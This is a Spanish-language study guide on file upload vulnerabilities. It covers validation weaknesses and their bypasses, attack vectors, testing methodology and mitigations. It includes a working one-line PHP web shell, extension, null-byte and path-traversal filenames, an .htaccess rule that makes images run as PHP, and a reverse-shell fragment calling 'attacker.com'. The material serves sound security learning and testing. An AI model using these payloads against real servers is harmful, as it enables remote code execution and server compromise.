# File upload vulnerabilities

## 📤 ¿Qué son las vulnerabilidades de File Upload?

Las **vulnerabilidades de subida de archivos** ocurren cuando una aplicación permite subir archivos sin validar correctamente qué se está subiendo.

Esto permite a un atacante:

* Subir web shells (RCE)
* Sobrescribir archivos del sistema
* Almacenar archivos maliciosos
* Evadir controles de seguridad
* Aprovechar fallos en validación

El problema clave es que los archivos subidos pueden ejecutarse con los permisos del servidor.

***

## 🔍 Mecanismos de validación (y debilidades)

### 🧑‍💻 Validación en cliente

* JavaScript → fácilmente bypass con Burp
* No se aplica a peticiones HTTP reales

### 📡 Validación de Content-Type

```http
Content-Type: image/jpeg
```

* Controlado por el atacante
* No fiable

### 🚫 Blacklist de extensiones

* Bloquea: `.php`, `.phtml`
* Bypass:
  * `.php3`, `.phar`
  * `.PHP` (case)

### ✅ Whitelist de extensiones

* Permite: `.jpg`, `.png`

Bypass:

```
shell.php.jpg
shell.php%00.jpg
```

### 🧬 Magic bytes

* PNG, JPEG, GIF
* Solo revisa primeros bytes
* Bypass con polyglots

### 🧪 Validación de contenido

* Librerías de imagen
* Puede fallar con archivos manipulados

***

## 💣 Vectores de ataque

### ➡️ Web shell

```php
<?php system($_GET['cmd']); ?>
```

### ➡️ Bypass de Content-Type

```http
Content-Type: image/jpeg
filename="shell.php"
```

### ➡️ Ofuscación de extensión

```
shell.php.jpg
shell.php%00.jpg
shell.php.
```

### ➡️ Path traversal

```
../shell.php
..%2fshell.php
```

### ➡️ Polyglot

```
[Header PNG válido]
<?php system($_GET['cmd']); ?>
```

### ➡️ Subida de .htaccess

```apache
AddType application/x-httpd-php .jpg
```

Permite ejecutar imágenes como PHP.

### ➡️ Race condition

* Subir archivo
* Acceder antes de validación
* Explotar ventana de tiempo

***

## 🎯 Requisitos para explotación

### 📂 Acceso al archivo

* Ruta accesible
* No sandbox

### ⚙️ Ejecución

* El servidor ejecuta ese tipo de archivo
* No está deshabilitado

### 📍Rutas típicas

* `/uploads/`
* `/images/`
* `/media/`

***

## 🧠 Tipos de web shells

### ➡️ Básico

```php
<?php system($_GET['cmd']); ?>
```

### ➡️ Completo

```php
system($_REQUEST['cmd']);
```

### ➡️ Navegador de archivos

```php
scandir($dir);
```

### ➡️ Reverse shell

```php
fsockopen("attacker.com",4444);
```

***

## 🌍 Ejemplos reales

* Upload de avatar → RCE
* Plugins de WordPress
* CMS vulnerables

***

## 💥 Impacto

### 🚨 Crítico

* RCE
* Compromiso total
* Acceso a base de datos

### ⚠️ Alto

* XSS almacenado
* Defacement
* DoS

### 📊 Medio

* Filtración de datos
* Descargas maliciosas

***

## 🛡️ Mitigación

### ✅ Validación de extensión

```python
ALLOWED_EXTENSIONS = {'jpg','png'}
```

### 🧪 Validación de contenido

```python
Image.open(file).verify()
```

### 🔒 Almacenamiento seguro

* Fuera del web root
* Nombres aleatorios (UUID)
* Sin ejecución

### ⚙️ Configuración

```apache
php_flag engine off
```

### 🧹 Procesamiento

* Eliminar metadata
* Re-encode
* Antivirus

### 🧱 Defensa en profundidad

* Validar extensión
* Validar MIME
* Validar contenido
* AV
* Sin ejecución

***

## 🧪 Metodología de testeo

### ➡️ Básico

* Subir archivo normal
* Subir `.php`
* Probar bypass

### ➡️ Fuzzing extensiones

```
.php, .phtml, .phar, .jsp
```

### ➡️ Fuzzing Content-Type

```
image/jpeg
application/octet-stream
```

### ➡️ Path traversal

```
../shell.php
```

### ➡️ Polyglot

```bash
cat image.png > shell.php
```

***

## 🛠️ Herramientas

### 💣 Web shells

* weevely
* China Chopper
* WSO

### 📚 Payloads

* PayloadsAllTheThings
* SecLists

### 🤖 Automatización

* Burp Intruder
* Scripts Python
* fuxploider
